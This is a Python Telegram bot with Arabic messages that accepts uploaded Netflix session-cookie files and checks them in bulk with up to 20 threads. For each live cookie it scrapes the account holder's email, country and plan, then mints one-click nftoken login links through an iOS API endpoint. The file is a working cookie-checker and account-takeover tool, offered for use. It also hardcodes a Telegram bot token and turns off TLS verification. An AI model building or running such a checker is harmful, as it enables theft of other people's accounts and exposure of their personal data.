import copy
import html
import json
import os
import queue
import random
import re
import shutil
import string
import sys
import threading
import unicodedata
import zipfile
import io
from datetime import datetime, timedelta, timezone
from urllib.parse import quote, urlparse

import requests
from urllib3.exceptions import InsecureRequestWarning
import telebot

try:
    import yaml
except ImportError:
    yaml = None

TELEGRAM_BOT_TOKEN = "8405233850:AAGjodPeCXW8TVX9b75oPeTzNEKFvtbW8FA"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"

os.makedirs(cookies_folder, exist_ok=True)
os.makedirs(output_folder, exist_ok=True)
os.makedirs(failed_folder, exist_ok=True)
os.makedirs(broken_folder, exist_ok=True)

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    for _ in range(3):
        previous = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
        if cleaned == previous:
            break
    return re.sub(r"\s+", " ", cleaned).strip() or None

def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)

def is_netflix_domain(domain):
    normalized = str(domain or "").strip()
    if normalized.startswith("#HttpOnly_"):
        normalized = normalized[len("#HttpOnly_"):]
    return "netflix." in normalized.lower()

def is_netflix_cookie_entry(domain, name):
    return canonicalize_netflix_cookie_name(name) in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    return all(decode_netflix_value(cookie_dict.get(c)) for c in LOGIN_REQUIRED_NETFLIX_COOKIES)

def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped or (stripped.startswith("#") and not stripped.startswith("#HttpOnly_")):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", stripped, maxsplit=6)
    return parts if len(parts) >= 7 else []

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain, name = parts[0], canonicalize_netflix_cookie_name(parts[5])
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append({
            "domain": domain.replace("#HttpOnly_", "", 1),
            "tail_match": "TRUE" if parts[1].upper() == "TRUE" else "FALSE",
            "path": parts[2],
            "secure": "TRUE" if parts[3].upper() == "TRUE" else "FALSE",
            "expires": parts[4],
            "name": name,
            "value": parts[6],
            "position": index,
        })
    return entries

def extract_json_cookie_entries(content):
    try:
        json_data = json.loads(content)
    except Exception:
        return []
    if isinstance(json_data, dict):
        json_data = json_data.get("cookies", json_data.get("items", [json_data]))
    if not isinstance(json_data, list):
        return []
    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append({
            "domain": str(domain),
            "tail_match": "TRUE" if str(domain).startswith(".") else "FALSE",
            "path": cookie.get("path", "/"),
            "secure": "TRUE" if cookie.get("secure", False) else "FALSE",
            "expires": str(cookie.get("expirationDate", cookie.get("expiration", 0))),
            "name": name,
            "value": str(cookie.get("value", "")),
            "position": index,
        })
    return entries

# دعم استخراج الكوكيز من النصوص العادية (Raw Strings / Headers)
def extract_raw_cookie_entries(content):
    bundles = []
    for index, line in enumerate(content.splitlines()):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "netflixid" in line.lower():
            cookie_dict = {}
            parts = re.split(r'[;\t]+', line)
            for part in parts:
                if "=" in part:
                    k, v = part.split("=", 1)
                    k_clean = canonicalize_netflix_cookie_name(k.strip())
                    cookie_dict[k_clean] = v.strip()
            if has_required_netflix_cookies(cookie_dict):
                netscape_text = "\n".join(f".netflix.com\tTRUE\t/\tTRUE\t0\t{k}\t{v}" for k, v in cookie_dict.items())
                bundles.append({
                    "index": len(bundles) + 1,
                    "total": 1,
                    "netscape_text": netscape_text,
                    "cookies": cookie_dict
                })
    return bundles

def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = extractor(content)
        if bundles:
            return bundles
    return []

def extract_info_from_graphql_payload(response_text):
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}
    data = payload.get("data") if isinstance(payload, dict) else {}
    if not isinstance(data, dict):
        return {}
    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    profiles = growth_account.get("profiles") or []
    
    profile_names = [decode_netflix_value(p.get("name")) for p in profiles if isinstance(p, dict) and p.get("name")]
    feature_types = [str(f.get("type")).upper() for f in (current_plan.get("availableFeatures") or []) if isinstance(f, dict) and f.get("type")]
    hold_status = hold_meta.get("isUserOnHold") or growth_account.get("isUserOnHold") or growth_account.get("holdStatus")

    return {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(((current_profile.get("growthEmail") or {}).get("email") or {}).get("value")),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No",
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name")),
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": "Yes" if hold_status else "No",
        "profiles": ", ".join(profile_names) if profile_names else None,
    }

def extract_info(response_text):
    info = extract_info_from_graphql_payload(response_text)
    if not info.get("countryOfSignup"):
        m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', response_text)
        if m:
            info["countryOfSignup"] = m.group(1)
    return info

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    return re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_") or "unknown"

def is_extra_member_account(info):
    localized_plan = decode_netflix_value(info.get("localizedPlanName")) or ""
    membership_status = decode_netflix_value(info.get("membershipStatus")) or ""
    markers = ("extra member", "miembro extra", "suscriptor extra", "assinante extra", "abbonato extra", "membro extra", "额外成员", "추가 회원")
    return any(m in localized_plan.lower() or m in membership_status.lower() for m in markers)

def is_on_hold_account(info):
    hold = str(info.get("holdStatus", "")).lower()
    status = normalize_plan_key(info.get("membershipStatus"))
    return hold in {"yes", "true", "1"} or any(t in status for t in ("hold", "past_due", "paused", "suspend"))

def is_subscribed_account(info):
    status = normalize_plan_key((info or {}).get("membershipStatus"))
    return status == "current_member" or is_extra_member_account(info) or bool((info or {}).get("localizedPlanName"))

def get_nftoken_expiry_utc(expires=None):
    if isinstance(expires, (int, float)):
        try:
            timestamp = int(expires)
            if len(str(abs(timestamp))) == 13:
                timestamp //= 1000
            return datetime.fromtimestamp(timestamp, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        except Exception:
            pass
    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    if not netflix_id:
        return None, "Missing cookies"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    for _ in range(attempts):
        try:
            r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
            if r.status_code == 200:
                data = r.json()
                token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
                token = decode_netflix_value(token_data.get("token"))
                expires = token_data.get("expires")
                if token:
                    return {"token": token, "expires_at_utc": get_nftoken_expiry_utc(expires)}, None
        except Exception:
            pass
    return None, "API error"

def build_nftoken_links(token):
    return [
        ("🖥️ PC", f"https://netflix.com/?nftoken={token}"),
        ("📱 Phone", f"https://netflix.com/unsupported?nftoken={token}"),
        ("📺 TV", f"https://netflix.com/tv2?nftoken={token}"),
    ]

def get_account_page(session, request_timeout=15):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
    try:
        response = session.get("https://www.netflix.com/account/membership", headers=headers, timeout=request_timeout)
        if response.status_code == 200 and response.text:
            return response.text, 200, extract_info(response.text)
    except Exception:
        pass
    return None, 500, None

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "مرحباً بك! أرسل ملف كوكيز (JSON أو TXT أو ZIP) وسأقوم بفحصه بأعلى كفاءة.")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    file_info = bot.get_file(message.document.file_id)
    file_name = message.document.file_name.lower()

    if not (file_name.endswith('.json') or file_name.endswith('.txt') or file_name.endswith('.zip')):
        bot.reply_to(message, "⚠️ يرجى إرسال ملف بصيغة JSON أو TXT أو ZIP فقط.")
        return

    msg = bot.reply_to(message, "⏳ جاري فحص الكوكيز عبر الخيوط المتعددة ومعالجة الـ GraphQL...")

    try:
        downloaded_file = bot.download_file(file_info.file_path)
        bundles_to_check = []

        if file_name.endswith('.zip'):
            with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                valid_files = [f for f in z.namelist() if f.endswith(('.json', '.txt')) and not f.startswith('__MACOSX/') and not f.startswith('.')]
                for filename in valid_files:
                    with z.open(filename) as f:
                        bundles = extract_netflix_cookie_bundles(f.read().decode('utf-8', errors='ignore'))
                        if bundles:
                            for b in bundles:
                                bundles_to_check.append((f"{filename} [Part {b['index']}]", b))
        else:
            bundles = extract_netflix_cookie_bundles(downloaded_file.decode('utf-8', errors='ignore'))
            if bundles:
                for b in bundles:
                    bundles_to_check.append((f"{file_name} [Part {b['index']}]", b))

        if not bundles_to_check:
            bot.edit_message_text("⚠️ لم يتم العثور على كوكيز صالحة أو الصيغة غير مدعومة.", chat_id=message.chat.id, message_id=msg.message_id)
            return

        task_queue = queue.Queue()
        for item in bundles_to_check:
            task_queue.put(item)

        results_lock = threading.Lock()
        working_count = [0]
        expired_count = [0]
        results_text = [""]

        def worker():
            while not task_queue.empty():
                try:
                    name, bundle = task_queue.get_nowait()
                except queue.Empty:
                    break

                cookies = bundle["cookies"]
                if not has_required_netflix_cookies(cookies):
                    with results_lock:
                        expired_count[0] += 1
                    continue

                session = requests.Session()
                session.cookies.update(cookies)
                resp_text, code, info = get_account_page(session)

                if code == 200 and info and info.get("countryOfSignup"):
                    is_sub = is_subscribed_account(info)
                    if is_sub:
                        with results_lock:
                            working_count[0] += 1
                        plan = info.get("localizedPlanName") or "Active Plan"
                        country = info.get("countryOfSignup") or "Unknown"
                        email = info.get("email") or "N/A"
                        on_hold = " (On Hold ⏸️)" if is_on_hold_account(info) else ""
                        extra_mem = " (Extra Member 👥)" if is_extra_member_account(info) else ""

                        nftoken_data, _ = create_nftoken(cookies)

                        res = f"✅ **الحساب شغال:** `{name}`{on_hold}{extra_mem}\n"
                        res += f"🌍 الدولة: `{country}` | 📦 الخطة: `{plan}`\n"
                        res += f"📧 الإيميل: `{email}`\n"

                        if nftoken_data:
                            links = build_nftoken_links(nftoken_data["token"])
                            for lbl, lnk in links:
                                res += f"{lbl}: [اضغط هنا]({lnk}) | "
                            res += f"\n⏳ تنتهي في: `{nftoken_data['expires_at_utc']}`\n"

                        with results_lock:
                            results_text[0] += res + "\n-------------------\n"
                    else:
                        with results_lock:
                            expired_count[0] += 1
                else:
                    with results_lock:
                        expired_count[0] += 1
                task_queue.task_done()

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(min(20, len(bundles_to_check)))]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        summary = f"📊 **نتائج فحص الكوكيز:**\n\n🟢 شغال: {working_count[0]}\n🔴 منتهي: {expired_count[0]}\n\n{results_text[0]}"
        if len(summary) > 4000:
            summary = summary[:4000] + "\n...(تم اختصار النتائج للطول)"

        bot.edit_message_text(summary, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="Markdown", disable_web_page_preview=True)

    except Exception as e:
        bot.edit_message_text(f"⚠️ حدث خطأ أثناء المعالجة: {str(e)}", chat_id=message.chat.id, message_id=msg.message_id)

if __name__ == "__main__":
    print("[🚀] Telegram Bot Engine with Raw Cookie Support is running successfully...")
    bot.infinity_polling()
